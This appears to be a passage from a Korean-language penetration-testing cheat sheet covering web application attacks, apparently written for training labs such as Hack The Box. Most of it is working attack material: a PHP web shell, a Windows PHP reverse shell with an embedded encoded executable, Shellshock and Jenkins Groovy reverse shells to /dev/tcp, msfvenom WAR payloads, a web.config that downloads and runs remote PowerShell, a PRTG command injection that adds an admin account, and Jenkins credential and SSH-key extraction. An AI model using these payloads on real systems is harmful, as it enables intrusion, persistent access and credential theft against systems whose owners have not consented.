curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

#### 다수의 uid에서 문서 다운로드
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

# uid 1부터 10까지 반복
for i in {1..10}; do
        # 각 uid의 문서 링크 추출 및 다운로드
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

---

### 해시된 ID를 사용하는 경우

#### Base64 + MD5 조합 우회
```bash
#!/bin/bash

# uid를 Base64로 인코딩 후 MD5 해시하여 요청
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**활용 사례:**
- 서버가 uid를 Base64 인코딩 후 MD5 해시하여 사용하는 경우
- 순차적인 ID를 예측 가능한 방식으로 변환한 경우

</details>

---
<details>
<summary><strong>awscli</strong></summary>
  
```bash
aws configure

aws s3 --endpoint-url=http://s3.thetoppers.htb ls

aws s3 --endpoint-url=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php .

aws s3 --endpoint-url=http://s3.thetoppers.htb cp ex.php s3://thetoppers.htb
```

</details>

---
<details>
  <summary><strong>PHP</strong></summary>

## Vulnerable Functions test
- https://github.com/teambi0s/dfunc-bypasser
```bash
python2 dfunc-bypasser.py --file ../response
```

## strcmp
```php
if (strcmp($username, $_POST['username']) == 0)
```
- `strcmp`함수가 같은 값이면 0을 반환.
- PHP에서 파라미터를 제대로 검사하지 않으면 array를 전달할 수 있게 됨.(username=value 대신에 username[]=value)
- NULL 값은 0
<img width="775" height="372" alt="image" src="https://github.com/user-attachments/assets/8cfd0a24-61ef-425f-8354-9d05d5c0c5e8" />

## type check
```php
# success
if ("val" == true) {echo "success";} else {echo "fail";}
```
- `==`만 쓸 경우 타입 검사를 하지 않게 되어서 `success`가 출력 됨.
- `JSON`데이터를 다룰 때 타입 검사가 제대로 되지 않을 경우 우회가 가능.

## PHAR
- PHP 파일과 리소스를 하나의 파일로 묶어서 배포하고 실행할 수 있게 해주는 PHP의 아카이브 형식
- Java의 JAR 파일과 유사한 개념
- 실행 가능한 ZIP 파일
- `phpinfo`로 허용되는 함수 확인 후 실행.

```bash
# phar 생성하여 업로드(<?php phpinfo(); ?>)
zip test.phar test.php

# phar 접근
curl http://dev.siteisup.htb/?page=phar://uploads/test.phar/test
```

## proc_open web shell
- https://github.com/d4rkiZ/ProcOpen-PHP-Webshell
```php
<?php
// interactive and user-friendly 

// Define a custom function to execute commands
function execute_command($cmd) {
    // Use proc_open to execute the command
    $descriptors = [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w']  // stderr
    ];

    $process = proc_open($cmd, $descriptors, $pipes);

    if (is_resource($process)) {
        // Read the output and errors
        $output = stream_get_contents($pipes[1]);
        $errors = stream_get_contents($pipes[2]);

        // Close the pipes
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        // Close the process
        proc_close($process);

        // Prepare the output for HTML display
        $output = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
        $errors = htmlspecialchars($errors, ENT_QUOTES, 'UTF-8');

        // Output the result in a user-friendly manner
        echo '<pre>';
        echo '<strong>Command:</strong> ' . $cmd . "\n\n";
        echo '<strong>Output:</strong>' . "\n" . $output . "\n";
        echo '<strong>Errors:</strong>' . "\n" . $errors . "\n";
        echo '</pre>';
    }
}

// Check if a command is submitted
if (isset($_POST['command'])) {
    // Get the command from the form submission and execute it
    $command = $_POST['command'];
    execute_command($command);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>W3bSh3ll by d4rkiZ</title>
</head>
<body>
    <h1>W3bSh3ll by d4rkiZ</h1>
    <form method="POST" action="">
        <input type="text" name="command" placeholder="Enter your command">
        <button type="submit">Send</button>
    </form>
</body>
</html>
```

## Windows php reverse shell
- https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
```php
<?php

header('Content-type: text/plain');
$ip   = "192.168.1.9"; //change this 
$port = "1234"; //change this
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
			            
?>
```

</details>

---

<details>
  <summary><strong>Application Attack</strong></summary>

## Enumeration
```bash
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

sudo nmap --open -sV 10.129.201.50

eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

</details>

---
<details>
    <summary><strong>Wordpress</strong></summary>

```bash
curl http://<wordpress>/robots.txt

curl http://<wordpress>/wp-login.php

curl http://<wordpress> | grep -i wordpress

curl http://<wordpress> | grep themes

curl http://<wordpress> | grep plugins

curl http://<wordpress>/?p=1 | grep plugins
```
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### RCE
- `Appearance > Theme Editor`
<img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/b72d9500-b5f0-45af-b05f-6485d08a04bf" />

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
    
</details>

---
<details>
    <summary><strong>joomla</strong></summary>

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s http://dev.inlanefreight.local/README.txt | head -n 5

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
```bash
git clone https://github.com/drego85/JoomlaScan

python2.7 joomlascan.py -u http://dev.inlanefreight.local
```
```bash
git clone https://github.com/ajnik/joomla-bruteforce

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
### RCE
- `CONFIGURATION > Templates`
<img width="1461" height="935" alt="image" src="https://github.com/user-attachments/assets/aaf319ac-3d97-461d-a49f-38f09c07685e" />
    
</details>

---
<details>
    <summary><strong>Drupal</strong></summary>

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

curl -s http://drupal.inlanefreight.local/node/<nodeid>

# Old Version
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

### RCE
#### Older Version
- 로그인 이후 상단
- `Modules > PHP Filter` check
- `Content > Add Content > Basic page`
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
#### Latest Version
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- `Administration > Reports > Available updates > Install`
- `Content > Basic page`
#### Upload Module
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz
```
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- `.htaccess`
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
```bash
mv shell.php .htaccess captcha

tar cvf captcha.tar.gz captcha/
```
- `Manage > Install new module > Install`
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
    
</details>

---
<details>
    <summary><strong>Apache</strong></summary>

- `gobuster`를 사용할 때 `/cgi-bin`이 파일로 취급되는 경우가 있어 `/cgi-bin/`를 wordlist에 추가해서 검색.
-  `php`


### ShellShock(테스트를 해봐야 취약한지 알 수 있다.)
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,sh,pl,py

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

### .htaccess bypass
- `.htaccess`가 업로드 가능하면 우회.
```bash
# cat .htaccess
AddType application/x-httpd-php .php16
```
    
</details>

---
<details>
    <summary><strong>TOMCAT</strong></summary>

- `JSP`

```bash
curl http://app-dev.inlanefreight.local:8080/invalid

curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
- `tomcat-users.xml`
```bash
git clone https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce

python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
### RCE
- `http://web01.inlanefreight.local:8180/manager/html > deploy war file`
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

### CGI
- `enableCmdLineArguments` feature enabled
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
- `http://10.129.204.227:8080/cgi/welcome.bat?&dir`
- `http://10.129.204.227:8080/cgi/welcome.bat?&set`
- `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
- `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

### /manager/text
- `/manager/text`접속 시도.
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.15.214:8080/manager/text/list
```
<img width="1104" height="165" alt="image" src="https://github.com/user-attachments/assets/43165666-8e02-43ef-bff7-75d82c1e4b26" />

<br>
<br>

- `war`파일 업로드.
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp

curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file backup.war 'http://10.129.15.214:8080/manager/text/deploy?path=/backup&update=true'
```

<br>

```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

</details>

---
<details>
    <summary><strong>Jenkins</strong></summary>

- `workspace`를 통해서 원격에서 로컬로 파일 공유가 가능.
- https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa
<img width="784" height="385" alt="image" src="https://github.com/user-attachments/assets/dc6cb047-e24f-4b6c-89fe-72da880f4a2c" />


## New Item
- `New Item` -> `Freestyle project` -> `Build` -> `Select Windows batch Command`
- `Build Now` -> `Console Output`
<img width="1096" height="277" alt="image" src="https://github.com/user-attachments/assets/2635718d-2a82-4375-b78e-6f9771e10673" />

## Script Console
- `Manage Jenkins` -> `Script Console`
```groovy
cmd = ""
println cmd.execute().text
```
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```groovy
String host="<local IP>";
int port=<local PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Jenkins CLI
- https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client
```bash
# Download Jenkins CLI from server
wget http://<jenkins server>/jnlpJars/jenkins-cli.jar

java -jar jenkins-cli.jar -s 'http://<server>' help
```

## Decrypt key
- 숨겨진 비밀번호
<img width="1673" height="770" alt="image" src="https://github.com/user-attachments/assets/44516450-090d-4a08-87f5-7af4ddfedfef" />

<br>
<br>

- 브라우저에서 비밀번호 확인 가능.
<img width="1596" height="283" alt="image" src="https://github.com/user-attachments/assets/f8820145-916a-4fed-aa92-7a0c94d98b98" />

<br>
<br>

- 비밀번호 복호화
```groovy
println hudson.util.Secret.decrypt("{AQAAABAAAAAQ9Db4FBoIVP6J7HBc2bhBlwjf56/tbk5wtWWQbgD2NC8=}")
```

## Pipeline execute command
- `New Item -> Pipeline`
```
node{
    withCredentials([
        sshUserPrivateKey(
            credentialsId: '1',
            keyFileVariable: 'keyFile'
            )
        ]){
            sh "cat ${keyFile}"
        }
}
```
<img width="1293" height="457" alt="image" src="https://github.com/user-attachments/assets/da819e90-8647-4a6b-8b5a-5b9ac7394c47" />

- `Build Now -> Console Output`
<img width="1104" height="620" alt="image" src="https://github.com/user-attachments/assets/7bf6d4ce-4b71-4dee-a9f3-cd19a579eec9" />



</details>

---
<details>
    <summary><strong>Splunk</strong></summary>

- `nmap` 스캔으로 발견됨.
```bash
git clone https://github.com/0xjpuff/reverse_shell_splunk

tar -cvzf updater.tar.gz splunk_shell/
```
- `Apps > Install app from file`
    
</details>

---
<details>
    <summary><strong>PRTG Network Monitor</strong></summary>

- `nmap` 스캔으로 발견됨.
- `https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/`
- `setup > account settings > Notifications`
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
    
</details>

---
<details>
    <summary><strong>osTicket</strong></summary>

- `support portal`에서 새로운 티켓을 요청할 수 있으면 기업에서 사용하는 `email`로 생성이 가능할 수 있다.
<img width="1481" height="534" alt="image" src="https://github.com/user-attachments/assets/d92a174c-3f84-40d4-9215-0fa2a18060be" />
<img width="1467" height="968" alt="image" src="https://github.com/user-attachments/assets/ae03cd98-18c5-4c8b-aa23-9f3826447f67" />
    
</details>

---
<details>
    <summary><strong>Gitlab</strong></summary>

- `http://gitlab.inlanefreight.local:8081/explore`
```bash
git clone https://github.com/dpgg101/GitLabUserEnum

./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```
    
</details>

---
<details>
    <summary><strong>ColdFusion(8500)</strong></summary>

```bash
nmap -p- -sC -Pn 10.129.247.30 --open
```
<img width="1005" height="469" alt="image" src="https://github.com/user-attachments/assets/5a7eca71-d4cf-4c5d-94a1-5c155ccebacd" />
    
</details>

---
<details>
    <summary><strong>IIS</strong></summary>

- `aspx`

### 8.3 format enabled
```
http://example.com/~s
http://example.com/~se
http://example.com/~sec
...
http://example.com/secret~1/somefi~1.txt
```
```bash
git clone https://github.com/irsdl/IIS-ShortName-Scanner

java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

### davtest
```bash
davtest -url http://10.10.10.15
```

### cadaver
```
cadaver http://10.10.10.15

help
```

### Upload web.config RCE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.23/Invoke-PowerShellTcp.ps1')")
%>
```

</details>

---
<details>
    <summary><strong>magento</strong></summary>

```bash
wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar

php magescan.phar scan:all swagshop.htb
```
    
</details>

---
<details>
    <summary><strong>JS 난독화 해제</strong></summary>

- `eval()`를 `console.log()`로 바꿔서 콘솔에서 실행.
    
</details>

---
<details>
<summary><strong>BackDrop CMS</strong></strong></summary>

- https://github.com/FisMatHack/BackDropScan
    
</details>

---
<details>
    <summary><strong>Nagios XI</strong></summary>

- https://www.exploit-db.com/exploits/44560
- `api`를 사용하여 `admin`권한의 계정을 생성할 수 있다.
<img width="623" height="478" alt="image" src="https://github.com/user-attachments/assets/441431e3-38fc-4969-a1bb-67ace473eb9f" />


## RCE
- `Configure -> Core Config Manager -> Commands -> Add New`
<img width="982" height="590" alt="image" src="https://github.com/user-attachments/assets/b98abbb0-2fd1-4ebf-8cd5-ec483ae8ad04" />

<br>
<br>

- `Apply Configuration`
<img width="854" height="276" alt="image" src="https://github.com/user-attachments/assets/f6c9fc3a-af52-4870-8189-6e8fca5d95f5" />

<br>
<br>

- `Configure -> Core Config Manager -> Services -> Add New`
- `Run Check Command`
<img width="669" height="644" alt="image" src="https://github.com/user-attachments/assets/59406f75-0c5a-42c8-9a24-6a758ffadfa8" />

    
</details>
